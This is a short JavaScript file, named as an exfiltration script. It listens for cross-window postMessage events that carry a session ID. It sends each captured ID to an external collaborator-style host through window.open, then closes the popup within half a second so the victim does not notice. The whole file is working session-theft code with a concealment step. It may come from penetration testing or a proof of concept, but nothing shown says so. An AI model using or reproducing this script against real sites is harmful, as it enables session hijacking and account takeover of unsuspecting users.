 // session-id-exfil.js - Simplest exfil method                                                                                                       
  (function() {                                                                                                                                        
      console.log('[Exfil Script] Loaded - window.open() exfiltration');                                                                               
                                                                                                                                                       
      window.addEventListener('message', function(event) {                                                                                             
          if (event.data && event.data.type === 'sessionId' && event.data.value) {                                                                     
              const sessionId = event.data.value;                                                                                                      
              console.log('[Exfil Script] Session ID captured, exfiltrating...');                                                                      
                                                                                                                                                       
              // Simple navigation-based exfil - opens attacker URL with session ID                                                                    
              const exfilWindow = window.open(                                                                                                         
                  'https://1actygen45jsmn8hd48q7b9xvo1fp5du.oastify.com?sid=' + encodeURIComponent(sessionId),                                         
                  '_blank'                                                                                                                             
              );                                                                                                                                       
                                                                                                                                                       
              // Close the popup quickly so user doesn't notice                                                                                        
              if (exfilWindow) {                                                                                                                       
                  setTimeout(() => exfilWindow.close(), 500);                                                                                          
              }                                                                                                                                        
                                                                                                                                                       
              console.log('[Exfil Script] ✓ Exfiltrated via window.open()');                                                                           
          }                                                 
      });                                                                                                                                              
                                                            
      console.log('[Exfil Script] Listening for postMessage...');                                                                                      
  })();   
